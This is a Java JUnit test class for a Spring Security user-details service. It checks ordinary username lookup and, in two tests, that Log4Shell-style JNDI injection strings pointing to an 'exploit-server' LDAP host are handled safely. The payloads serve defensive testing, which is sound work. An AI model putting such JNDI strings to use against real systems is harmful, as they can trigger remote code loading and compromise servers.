package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
public class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("password");
        testUser.setEnabled(true);
    }

    @Test
    void loadUserByUsername_WithValidUsername_ReturnsUserDetails() {
        // Arrange
        when(userService.findByUsername("testuser")).thenReturn(testUser);

        // Act
        UserDetails userDetails = customUserDetailsService.loadUserByUsername("testuser");

        // Assert
        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertEquals("password", userDetails.getPassword());
        assertTrue(userDetails.isEnabled());
    }

    @Test
    void loadUserByUsername_WithNonExistentUser_ThrowsException() {
        // Arrange
        when(userService.findByUsername(anyString())).thenReturn(null);

        // Act & Assert
        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername("nonexistentuser");
        });
    }

    @Test
    void loadUserByUsername_WithJndiInjectionAttempt_HandlesInputSafely() {
        // Arrange
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections}";
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        // Act
        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        // Assert
        assertNotNull(userDetails);
        // The sanitized username should be used in the logs, but the original username
        // is still used to look up the user in the database
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }

    @Test
    void loadUserByUsername_WithComplexJndiInjectionAttempt_HandlesInputSafely() {
        // Arrange
        String maliciousUsername = "user${jndi:ldap://exploit-server:1389/serial/CommonsCollections}name";
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        // Act
        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        // Assert
        assertNotNull(userDetails);
        verify(userService, times(1)).findByUsername(maliciousUsername);
    }
}